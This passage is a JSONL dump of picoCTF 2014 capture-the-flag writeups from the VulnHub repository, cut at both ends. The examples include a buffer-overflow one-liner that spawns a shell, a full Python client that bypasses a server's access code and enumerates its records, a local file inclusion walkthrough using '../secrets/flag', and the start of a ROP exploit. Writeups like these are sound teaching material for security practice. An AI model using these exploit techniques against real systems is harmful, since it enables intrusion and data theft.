$ebp-0xc-16\n0xffffd6cc:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\n0xffffd6d4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\n0xffffd6dc:\t0x00\t0x00\t0x00\t0x00\n```\nAnd now, with more than 16 bytes...\n\n```\n0xffffd6cc:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\n0xffffd6d4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\n0xffffd6dc:\t0x41\t0x41\t0x41\t0x41\n```\n\nSo now we see that we can overflow the buffer.  Let's fill the last four bytes (secret) with 0xc0deface. Remember to put the bytes in little-endian order.\n\n```bash\npico1139@shell:/home/overflow1$ ./overflow1 $(python -c 'print \"A\"*16+\"\\xce\\xfa\\xde\\xc0\"')\n$ id\nuid=11066(pico1139) gid=1002(overflow1) groups=1017(picogroup)\n$ cat flag.txt\nooh_so_critical\n```\n\nSo the flag is **ooh_so_critical**\n\n", "timestamp": "2025-10-24T11:40:17.678978"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/pickle-jar.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/pickle-jar.md", "content": "### Solved by bitvijays\n\nPickle Jar is a 30 point forensics challenge. You are provided with a file named pickle.jar.\n\n> The police station offers free pickles to police officers. However, someone stole the pickles from the pickle jar! You find a clue on a USB drive left at the scene of the crime.\n\nJAR (Java ARchive) is a package file format typically used to aggregate many Java class files and associated metadata and resources (text, images, etc.) into one file to distribute application software or libraries on the Java platform. It can be extracted using **_jar xf pickle.jar_** which provided two folders (COM, META-INF) and one file named pickle.p, If you read the pickle.p file it contains \n```\nS'YOUSTOLETHEPICKLES'\np0 \n```\nThe flag is **YOUSTOLETHEPICKLES**\n\n", "timestamp": "2025-10-24T11:40:17.779907"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/png-or-not.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/png-or-not.md", "content": "### Solved by bitvijays\n\nPNG or Not is a 100 point forensics challenge. You are provided with a image.png file.\n\n> On a corner of the bookshelf, you find a small CD with an image file on it. It seems that this file is more than it appears, and some data has been hidden within. Can you find the hidden data?\n\nFirst step is always confirming with the file command.\n\n```\nfile image.png \nimage.png: PNG image data, 280 x 280, 8-bit/color RGB, non-interlaced\n```\nfile command confirms that it's PNG file. Next step was to view the file for hidden data using hexdump. PNG file contains IHDR and IEND which denotes the start and end of the PNG file. viewing the file in hexdump confirms this. It also shows that after IEND. There is data present with 7z and ascii representing flag.txt.\n```\nhexdump -C image.png\n\n00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|\n00000010  00 00 01 18 00 00 01 18  08 02 00 00 00 08 ec 7e  |...............~|\n00000020  db 00 00 00 06 74 52 4e  53 00 fe 00 01 00 fd 5b  |.....tRNS......[|\n00000030  6c 0d 3b 00 00 05 c1 49  44 41 54 78 9c ed dd 41  |l.;....IDATx...A|\n*************Trimmed************\n000005f0  02 42 82 80 90 20 f0 0b  3d 2b 08 3b 89 af 07 b9  |.B... ..=+.;....|\n00000600  00 00 00 00 49 45 4e 44  ae 42 60 82 37 7a bc af  |....IEND.B`.7z..|\n00000610  27 1c 00 03 b8 64 d3 c1  1a 00 00 00 00 00 00 00  |'....d..........|\n00000620  50 00 00 00 00 00 00 00  b5 6b 69 46 00 22 92 c6  |P........kiF.\"..|\n00000630  ae 77 46 b4 23 6d f7 5d  c0 c0 a4 dc 1f a8 38 05  |.wF.#m.]......8.|\n00000640  57 b9 76 3e 20 00 01 04  06 00 01 09 1a 00 07 0b  |W.v> ...........|\n00000650  01 00 01 23 03 01 01 05  5d 00 00 01 00 0c 14 00  |...#....].......|\n00000660  08 0a 01 dc e1 0d de 00  00 05 01 11 13 00 66 00  |..............f.|\n00000670  6c 00 61 00 67 00 2e 00  74 00 78 00 74 00 00 00  |l.a.g...t.x.t...|\n00000680  14 0a 01 00 90 d6 20 07  48 db cf 01 15 06 01 00  |...... .H.......|\n00000690  20 00 00 00 00 00                                 | .....|\n00000696\n```\n\n7z represents a archive and file can be extracted using 7z.\n```\n7z x image.png \n\n7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18\np7zip Version 9.20 (locale=en_GB.utf8,Utf16=on,HugeFiles=on,4 CPUs)\n\nProcessing archive: image.png\n\nExtracting  flag.txt\n\nEverything is Ok\n\nSize:       20\nCompressed: 1686\n\ncat flag.txt\nEKSi7MktjOpvwesurw0v\n```\nThe flag is **EKSi7MktjOpvwesurw0v**\n\n", "timestamp": "2025-10-24T11:40:17.895757"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/police-records.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/police-records.md", "content": "### Solved by superkojiman\n\nPolice Records is a 140 point challenge. We're given the following desctipion:\n\n> A Theseus double agent has infiltrated the police force but the police won't give you access to their directory information. Thankfully you found the source code to their directory server. Write a client to interact with the server and find the duplicated badge number! The flag is the badge number.\nThe server is running on vuln2014.picoctf.com:21212.\n\nLet's take a look at the code for the directory server: \n\n```python\n#!/usr/bin/python\n\n\"\"\" Police Directory Service v1.2\"\"\"\n\nimport socketserver\nimport sys\nimport struct\nimport random\nimport json\n\nfrom os import urandom\n\nHOST = 'localhost'\nPORT = 21212\n\ndef xor(buf, key):\n    \"\"\" Repeated key xor \"\"\"\n\n    encrypted = []\n    for i, cr in enumerate(buf):\n        k = key[i % len(key)]\n        encrypted += [cr ^ k]\n    return bytes(encrypted)\n\ndef secure_pad(buf):\n    \"\"\" Ensure message is padded to block size. \"\"\"\n    key = urandom(5)\n    buf = bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]) + buf\n    buf = buf + urandom(16 - len(buf) % 16)\n    enc = xor(buf, key)\n    return enc\n\ndef remove_pad(buf):\n    \"\"\" Removes the secure padding from the msg. \"\"\"\n    if len(buf) > 0 and len(buf) % 16 == 0:\n        encrypted_key = buf[:5]\n        key = xor(encrypted_key, bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]))\n        dec = xor(buf, key)\n        return dec[5:20]\n\ndef generate_cookie():\n    \"\"\" Generates random transaction cookie. \"\"\"\n    cookie = random.randrange(1, 1e8)\n    return cookie\n\n\nclass TCPConnectionHandler(socketserver.BaseRequestHandler):\n    \"\"\" TCP Server \"\"\"\n\n    OFFICERS = json.loads(open(\"data.json\", \"r\").read())\n    client_information = {}\n\n    def get_officer_data(self, entry):\n        \"\"\" Retrieve binary format of officer. \"\"\"\n\n        if 0 <= entry and entry < len(self.OFFICERS):\n            return json.dumps(self.OFFICERS[entry]).encode(\"utf-8\")\n        return None\n\n    def secure_send(self, msg):\n        \"\"\" Sends msg back to the client securely. \"\"\"\n\n        cookie = generate_cookie()\n        data = struct.pack(\"!B2L128s\", 0xFF, cookie, len(msg), msg)\n        encrypted = secure_pad(data)\n        self.request.sendall(encrypted)\n        return cookie\n\n    def handle(self):\n        \"\"\" Handle client session\"\"\"\n        running = True\n        cookie = None\n        access = False\n\n        while running:\n            data = self.request.recv(1024)\n            if len(data) > 0:\n                if not access:\n                    try:\n                        code = struct.unpack(\"!i\", data)[0]\n                        if code == 0xAA:\n                            cookie = self.secure_send(b\"WELCOME TO THE POLICE RECORDS DIRECTORY\")\n                            access = True\n                        else:\n                            raise Exception\n                    except Exception as e:\n                        raise e\n                        self.request.sendall(b\"ACCESS CODE DENIED\")\n                        running = False\n                else:\n                    if len(data) % 16 == 0:\n                        decrypted = remove_pad(data)\n                        try:\n                            magic, user_cookie, badge, cmd, entry = \\\n                                    struct.unpack(\"!B2LHL\", decrypted)\n                            if magic != 0xFF or user_cookie != cookie:\n                                self.request.sendall(b\"INSECURE REQUEST\")\n                                running = False\n                            else:\n                                if cmd == 1:\n                                    officer = self.get_officer_data(entry)\n                                    if officer:\n                                        cookie = self.secure_send(officer)\n                                    else:\n                                        cookie = self.secure_send(b\"INVALID ENTRY -- OFFICER DOES NOT EXIST\")\n                                else:\n                                    cookie = self.secure_send(b\"INVALID COMMAND\")\n                        except Exception as e:\n                            raise e\n                            self.request.sendall(b\"MALFORMED REQUEST\")\n                            running = False\n            else:\n                running = False\n        self.request.close()\n\nclass Server(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    daemon_threads = True\n    allow_reuse_address = True\n\n    def __init__(self, server_address, RequestHandlerClass):\n        socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)\n\nif __name__ == \"__main__\":\n    server = Server((HOST, PORT), TCPConnectionHandler)\n    try:\n        server.serve_forever()\n    except KeyboardInterrupt:\n        sys.exit(0)\n```\n\nThe goal is to write a client that will interact with this directory server. So let's break down what the server is doing. The handle() function handles the client connections so let's start with that. \n\n```python\ndata = self.request.recv(1024)\nif len(data) > 0:\n    if not access:\n        try:\n            code = struct.unpack(\"!i\", data)[0]\n            if code == 0xAA:\n                cookie = self.secure_send(b\"WELCOME TO THE POLICE RECORDS DIRECTORY\")\n                access = True\n            else:\n                raise Exception\n        except Exception as e:\n            raise e\n            self.request.sendall(b\"ACCESS CODE DENIED\")\n            running = False\n```\n\nThe server reads in 1024 bytes of input from the client and checks to see if we have an access code. If we don't, it waits for us to send one. An access code is required to interact with the server, so this is the first check that we need to bypass. Fortunately it's relatively simple, it's waiting for us to send 0xAA in network byte order:\n\n```python\ncode = struct.unpack(\"!i\", data)[0]\nif code == 0xAA:\n    cookie = self.secure_send(b\"WELCOME TO THE POLICE RECORDS DIRECTORY\")\n    access = True\n```\n\nIf we set the access code, then the server replies with a welcome message. So we just need to reverse this by using struct.pack(). Here's how it looks:\n\n```python\n#!/usr/local/bin/python3\nimport struct, socket, sys\n\nip = \"vuln2014.picoctf.com\"\nport = 21212\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((ip, port))\n\n# send access code 0xAA in network byte order to server\ns.send(struct.pack(\"!i\", 0xAA)\nbuf = s.recv(1024)\nprint(\"recv:\", buf)\n```\n\nNote that I'm using python3 for this. The reason is that the directory_server.py is using python3 as well, and this became apparent later on when I was examining the xor() function. The xor() function performs an xor on two strings using the ^ operator, which only works on python3. Ok, back to the client, let's run it:\n\n```python\n$ ./police_client.py\nrecv: b'\\x10\\x08\\xad\\xb6\\xde\\xfc?\\xb6\\x16G\\x03;\\xd6\\x7fyFw\\x95\\x17cF\\x1b\\x82\\x17\\x0eWs\\x93x~Lw\\x9f\\x1bk#i\\x93\\x1baQ\\x7f\\x85xjJi\\x93\\x1bzLi\\x8fX.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\xd6X.\\x03;\\x9e\\xe5'\n``` \n\nGreat we got something back, but it looks nothing like the welcome message we were expecting. Let's take a look at what the server is sending us. \n\n```python\ncookie = self.secure_send(b\"WELCOME TO THE POLICE RECORDS DIRECTORY\")\n```\n\nIf we set the access code correctly, which we did, then it calls secure_send() and passes it the string to send back to the client. Here's what it looks like:\n\n```python\ndef secure_send(self, msg):\n    \"\"\" Sends msg back to the client securely. \"\"\"\n\n    cookie = generate_cookie()\n    data = struct.pack(\"!B2L128s\", 0xFF, cookie, len(msg), msg)\n    encrypted = secure_pad(data)\n    self.request.sendall(encrypted)\n    return cookie\n```\n\nFirst it creates a cookie using the generate_cookie() function. generate_cookie() just creates a random value between 1 and 488. Next, a data structure is created containing a byte 0xFF (referred to as magic in the server code), the cookie, the length of the message, and the message itself. This data structure is then passed to a function secure_pad():\n\n```python\ndef secure_pad(buf):\n    \"\"\" Ensure message is padded to block size. \"\"\"\n    key = urandom(5)\n    buf = bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]) + buf\n    buf = buf + urandom(16 - len(buf) % 16)\n    enc = xor(buf, key)\n    return enc\n```\n\nThis pads the data structure to block size and then encrypts it using xor() before returning it. Fortunately we don't have to reverse this as it's already done for us in the remove_pad() function:\n\n```python\ndef remove_pad(buf):\n    \"\"\" Removes the secure padding from the msg. \"\"\"\n    if len(buf) > 0 and len(buf) % 16 == 0:\n        encrypted_key = buf[:5]\n        key = xor(encrypted_key, bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]))\n        dec = xor(buf, key)\n        return dec[5:20]\n```\n\nSo now we know the server is encrypting a data structure containing the message and sending it back to us. We need to decrypt it using the remove_pad() function, and then unpack the decrypted data structure to get the message. We'll copy the function secure_pad(), remove_pad(), and xor() to our client code and unpack the server's reply:\n\n```python\n#!/usr/local/bin/python3\nimport struct, socket, sys\nfrom os import urandom\n\ndef xor(buf, key):\n    \"\"\" Repeated key xor \"\"\"\n    encrypted = []\n    for i, cr in enumerate(buf):\n        k = key[i % len(key)]\n        encrypted += [cr ^ k]\n\n    return bytes(encrypted)\n\n\ndef remove_pad(buf):\n    \"\"\" Removes the secure padding from the msg. \"\"\"\n    if len(buf) > 0 and len(buf) % 16 == 0:\n        encrypted_key = buf[:5]\n        key = xor(encrypted_key, bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]))\n        dec = xor(buf, key)\n\n        print(\"remove_pad() key    :\", key)\n        print(\"remove_pad() dec msg:\", dec)\n        print(\"\\n\")\n        return dec\n\ndef secure_pad(buf):\n    \"\"\" Ensure message is padded to block size. \"\"\"\n    key = urandom(5)\n    buf = bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]) + buf\n    buf = buf + urandom(16 - len(buf) % 16)\n    enc = xor(buf, key)\n    return enc\n\nip = \"vuln2014.picoctf.com\"\nport = 21212\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((ip, port))\n\n# send access code 0xAA in network byte order to server\ns.send(struct.pack(\"!i\", 0xAA))\nbuf = s.recv(1024)\nprint(\"recv:\", buf)\nprint(\"\\n\")\n\ndec = remove_pad(buf)\nmagic, cookie, msg_len, msg = struct.unpack(\"!B2L6s\", dec[5:20])\n\nprint(\"magic  :\", magic)\nprint(\"cookie :\", cookie)\nprint(\"msg_len:\", msg_len)\nprint(\"dec msg:\", msg)\n```\n\nI modified the remove_pad() function slightly to return the entire decrypted data structure instead of just a part of it, and I've added some debugging statements as well. Running it returns:\n\n```text\n$ ./police_client.py\nrecv: b\"\\xa6\\xec\\x19\\x93\\nJ\\xdc\\xb9\\xd5\\xb9\\xb5\\xdfbZ\\xad\\xf0\\x93!2\\xb7\\xf0\\xff62\\xda\\xe1\\x97']\\xaa\\xfa\\x93+>\\xbf\\x95\\x8d'>\\xb5\\xe7\\x9b1]\\xbe\\xfc\\x8d'>\\xae\\xfa\\x8d;}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdfb}\\xfa\\xb5\\xdf'!\"\n\n\nremove_pad() key    : b'\\xb5\\xdfb}\\xfa'\nremove_pad() dec msg: b\"\\x133{\\xee\\xf0\\xff\\x03\\xdb\\xa8C\\x00\\x00\\x00'WELCOME TO THE POLICE RECORDS DIRECTORY\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00E\\\\\"\n\n\nmagic  : 255\ncookie : 64727107\nmsg_len: 39\ndec msg: b'WELCOM'\n```\n\nOk now we're getting somewhere. We can decrypt the replies from the server. Now we need to send it a request to return information about officers in the directory. The code responsible for this in directory_server.py is:\n\n```python\nif len(data) % 16 == 0:\n    decrypted = remove_pad(data)\n    try:\n        magic, user_cookie, badge, cmd, entry = \\\n                struct.unpack(\"!B2LHL\", decrypted)\n        if magic != 0xFF or user_cookie != cookie:\n            self.request.sendall(b\"INSECURE REQUEST\")\n            running = False\n        else:\n            if cmd == 1:\n                officer = self.get_officer_data(entry)\n                if officer:\n                    cookie = self.secure_send(officer)\n                else:\n                    cookie = self.secure_send(b\"INVALID ENTRY -- OFFICER DOES NOT EXIST\")\n            else:\n                cookie = self.secure_send(b\"INVALID COMMAND\")\n```\n\nSo once we've set the access code, we can send a query request. We see that the server will remove the padding and decrypt the data we send, and then unpack it into several variables. It makes sure that magic and cookie match the ones that it sent us along with the welcome message. If it doesn't match, the server refuses to send us anything. If the magic and cookie check passes, and the command is set to 1, then the server will take the entry number we provide, grab the officer's records associated with it, and send it back to us. \n\nThe server unpacks the data using the format characters \"!B 2L H L\" so we need to pack a byte (0xFF), two unsigned longs (cookie, and badge), an unsigned short (cmd), and an unsigned long (entry). Here's the updated script to retrieve one record:\n\n```python\n.\n.\n.\n# send access code 0xAA in network byte order to server\ns.send(struct.pack(\"!i\", 0xAA))\nbuf = s.recv(1024)\n\ndec = remove_pad(buf)\nmagic, cookie, msg_len, msg = struct.unpack(\"!B2L6s\", dec[5:20])\n\n# build the request and send it\nprint(\"Retrieving entry 1 record using dummy badge 12345678\")\ndata = struct.pack(\"!B2LHL\", magic, cookie, 1234578, 1, 1)\nenc = secure_pad(data)\ns.send(enc)\n\n# get a response and decrypt it\nbuf = s.recv(1024)\ndec = remove_pad(buf)\nmagic, cookie, msg_len, msg = struct.unpack(\"!B2L6s\", dec[5:20])\n\nprint(\"magic  :\", magic)\nprint(\"cookie :\", cookie)\nprint(\"msg_len:\", msg_len)\nprint(\"dec msg:\", msg)\n```\n\nWe're sending a dummy badge number 12345678 and entry ID 1 to the server. Here's what happens when we run the updated script:\n\n```text\n$ ./police_client.py\nremove_pad() key    : b';j\\xe4\\x8cF'\nremove_pad() dec msg: b\"\\x133{\\xee\\xf0\\xff\\x04\\xaf\\x8b\\xfa\\x00\\x00\\x00'WELCOME TO THE POLICE RECORDS DIRECTORY\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa5\\xef\"\n\n\nRetrieving entry 1 record using dummy badge 12345678\nremove_pad() key    : b'\\x90\\xc3\\x92\\x0c\\x98'\nremove_pad() dec msg: b'\\x133{\\xee\\xf0\\xff\\x02}y\\xd1\\x00\\x00\\x00U{\"ACTIVE\": false, \"NAME\": \"Aisha Elton\", \"TITLE\": \"SECURITY GUARD\", \"BADGE\": 4219177}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x159'\n\n\nmagic  : 255\ncookie : 41777617\nmsg_len: 85\ndec msg: b'{\"ACTI'\n```\n\nExcellent, we've gotten information about the first officer, which includes the badge number in the dec variable. Using the msg_len, we can extract just the badge number itself:\n\n```python\nbadge = dec[msg_len+6:msg_len+13]\nprint(\"badge:\", badge)\n```\n\nThis gives us:\n\n```text\n.\n.\n.\nRetrieving entry 1 record using dummy badge 12345678\nremove_pad() key    : b'\\xaf\\x11Z\\xc8\\x99'\nremove_pad() dec msg: b'\\x133{\\xee\\xf0\\xff\\x00 \\x81|\\x00\\x00\\x00U{\"ACTIVE\": false, \"NAME\": \"Aisha Elton\", \"TITLE\": \"SECURITY GUARD\", \"BADGE\": 4219177}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x004'\n\n\nmagic  : 255\ncookie : 2130300\nmsg_len: 85\ndec msg: b'{\"ACTI'\nbadge: b'4219177'\n```\n\nHere's the completed script, which loops through entry IDs 1 to 1000 and stores each badge in a list. As a new badge is extracted, it checks if that badge ID is already in the list. If it isn't, it inserts it, and if it is, then we've found the duplicate badge, which is the flag. \n\n```python\n#!/usr/local/bin/python3\nimport struct, socket, sys\nfrom os import urandom\n\ndef xor(buf, key):\n    \"\"\" Repeated key xor \"\"\"\n    encrypted = []\n    for i, cr in enumerate(buf):\n        k = key[i % len(key)]\n        encrypted += [cr ^ k]\n\n    return bytes(encrypted)\n\n\ndef remove_pad(buf):\n    \"\"\" Removes the secure padding from the msg. \"\"\"\n    if len(buf) > 0 and len(buf) % 16 == 0:\n        encrypted_key = buf[:5]\n        key = xor(encrypted_key, bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]))\n        dec = xor(buf, key)\n        return dec\n\ndef secure_pad(buf):\n    \"\"\" Ensure message is padded to block size. \"\"\"\n    key = urandom(5)\n    buf = bytes([0x13, 0x33, 0x7B, 0xEE, 0xF0]) + buf\n    buf = buf + urandom(16 - len(buf) % 16)\n    enc = xor(buf, key)\n    return enc\n\nip = \"vuln2014.picoctf.com\"\nport = 21212\nbadges = []\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((ip, port))\n\n# send access code 0xAA in network byte order to server\ns.send(struct.pack(\"!i\", 0xAA))\nbuf = s.recv(1024)\n\ndec = remove_pad(buf)\nmagic, cookie, msg_len, msg = struct.unpack(\"!B2L6s\", dec[5:20])\n\n\nfor entry in range(1, int(sys.argv[1])):\n    # build the request and send it\n    data = struct.pack(\"!B2LHL\", magic, cookie, 1234578, 1, entry)\n    enc = secure_pad(data)\n    s.send(enc)\n\n    # get a response and decrypt it\n    buf = s.recv(1024)\n    dec = remove_pad(buf)\n    magic, cookie, msg_len, msg = struct.unpack(\"!B2L6s\", dec[5:20])\n\n    # extract the badge\n    badge = dec[msg_len+6:msg_len+13]\n    print(\"entry: %d, badge: %s\" %(entry, badge))\n\n    # do we have a duplicate?\n    if badge in badges:\n        print(\"found duplicate badge:\", badge)\n        break\n\n    # badge has no found duplicate yet, add to the list\n    badges.append(badge)\n```\n\nWhen we run this, it receives a listing of officer's badges, until it finds the duplicate badge:\n\n```\n$ ./police_client.py 1000\nentry: 1, badge: b'4219177'\nentry: 2, badge: b'3260685'\nentry: 3, badge: b'7083824'\nentry: 4, badge: b'4700315'\n.\n.\n.\nentry: 899, badge: b' 840952'\nentry: 900, badge: b'8929869'\nentry: 901, badge: b'1703131'\nentry: 902, badge: b'6541803'\nentry: 903, badge: b'1430758'\nfound duplicate badge: b'1430758'\n```\n\nThe flag is **1430758**\n", "timestamp": "2025-10-24T11:40:17.990000"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/potentially-hidden-password.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/potentially-hidden-password.md", "content": "### Solved by superkojiman\n\nPotentially Hidden Password is a 100 point web exploitation challenge. \n\n> This Daedalus Corp. website loads images in a rather odd way... [Source Code]\n\nHere's the webpage:\n\n![](/images/2014/pico/potentially_hidden_password/01.png)\n\nLooking at the source reveals the location of the flag: \n\n```php\n  <?php\n     $config_file = fopen(\"/resources/config/admin_mode.config\", \"r\");\n     if (fgets($config_file) === \"true\") {\n        $flag_file = fopen(\"/resources/secrets/flag\", \"r\");\n        echo fgets($flag_file);\n        flose($flag_file);\n     }\n     fclose($config_file);\n       ?>\n</div>\n```\n\nThe description says the images are loaded in a strange way. Let's have a look: \n\n```\n<center>\n  <img src=\"file_loader.php?file=zone1.jpg\" class=\"zone\"/>\n  <img src=\"file_loader.php?file=zone2.jpg\" class=\"zone\"/>\n  <img src=\"file_loader.php?file=zone3.jpg\" class=\"zone\"/><br><br>\n  <img src=\"file_loader.php?file=zone4.jpg\" class=\"zone\"/>\n  <img src=\"file_loader.php?file=zone5.jpg\" class=\"zone\"/>\n  <img src=\"file_loader.php?file=zone6.jpg\" class=\"zone\"/><br>\n</center>\n```\n\nSmells like local file inclusion. Let's capture the request in BurpSuite's proxy mode and change one of the image files to flag:\n\n![](/images/2014/pico/potentially_hidden_password/02.png)\n\nWe get the following response: \n\n![](/images/2014/pico/potentially_hidden_password/03.png)\n\nNow we know what the current directory is. Let's do this again but specify ../secrets/flag instead of just flag\n\n![](/images/2014/pico/potentially_hidden_password/04.png)\n\nThe flag is **i_like_being_included**\n", "timestamp": "2025-10-24T11:40:18.068033"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/redacted.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/redacted.md", "content": "### Solved by bitvijays\n\nIn the excercise, you are given a PDF, but important information is hidden somehow.\n>You found a letter that may shed light on recent events.\n\nTo solve this, we opened the file in <a href=\"http://www.rttsoftware.com/\">PDF Explorer</a> and Extract the Images. \n\nPDF Original:\n![](/images/2014/pico/redacted/red1.png)\n\nImage Extracted:\n![](/images/2014/pico/redacted/red2.png)\n\nThe flag is **one_two_three_four**.\n", "timestamp": "2025-10-24T11:40:18.152096"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/robophoto.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/robophoto.md", "content": "### Solved by bitvijays\n\nRoboPhoto is a 30 point Miscellaneous challenge. You are provided with a poster or an image to search for the password.\n\n> Your father has been known to use the titles of his favorite books as passwords. While you don't remember any of the names of the books, your father keeps a poster for one of them on his wall. Can you figure out the name of the book and unlock the CD?\n\nEither you could upload the poster on <a href=\"https://images.google.com/\">Google Image Search Engine</a> or <a href=\"https://www.tineye.com/\">Tineye Reverse Image Search</a>, the results provide you the cover of the book with the title which is your flag.\n\nThe flag is **POSITRONIC MAN**\n\n", "timestamp": "2025-10-24T11:40:18.246864"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/rop1.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/rop1.md", "content": "### Solved by superkojiman\n\nROP1 is a 100 point exploitation challenge. We're given the following C code for rop1 and are told that it's running on a machine with ASLR: \n\n```c\n#include <stdlib.h>\n\nvoid be_nice_to_people(){\n    gid_t gid = getegid();\n    setresgid(gid, gid, gid);\n}\n\nvoid vuln(char *name){\n    char buf[64];\n    strcpy(buf, name);\n}\n\nint main(int argc, char **argv){\n    be_nice_to_people();\n    if(argc > 1)\n        vuln(argv[1]);\n    return 0;\n}\n```\n\nFrom the code provided we can see that there's a buffer overflow in the vuln() function due to the strcpy() call. Using pattern_create.rb and pattern_offset.rb, we find that EIP is at offset 76:\n\n```text\nroot@kali ~/pico-ctf/rop1\n# ./rop1 `pattern_create.rb 100`\nSegmentation fault (core dumped)\n\nroot@kali ~/pico-ctf/rop1\n# gdb -q -c core -batch -n -ex 'p $eip'\n[New LWP 6170]\nCore was generated by `./rop1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3'.\nProgram terminated with signal 11, Segmentation fault.\n#0  0x63413563 in ?? ()\n$1 = (void (*)()) 0x63413563\n\nroot@kali ~/pico-ctf/rop1\n# pattern_offset.rb 0x63413563\n[*] Exact match at offset 76\n```\n\nLet's run the program within gdb and see what the state of the registers and the stack are at the time of the crash. I provided an input of 76 \"A\"s and 4 \"B\"s to overwrite EIP and set a breakpoint after the call to strcpy(); that is *vuln+24\n\n```\ngdb-peda$ pdisass vuln\nDump of assembler code for function vuln:\n   0x08048e6d <+0>:     push   ebp\n   0x08048e6e <+1>:     mov    ebp,esp\n   0x08048e70 <+3>:     sub    esp,0x58\n   0x08048e73 <+6>:     mov    eax,DWORD PTR [ebp+0x8]\n   0x08048e76 <+9>:     mov    DWORD PTR [esp+0x4],eax\n   0x08048e7a <+13>:    lea    eax,[ebp-0x48]\n   0x08048e7d <+16>:    mov    DWORD PTR [esp],eax\n   0x08048e80 <+19>:    call   0x80481e0\n   0x08048e85 <+24>:    leave\n   0x08048e86 <+25>:    ret\nEnd 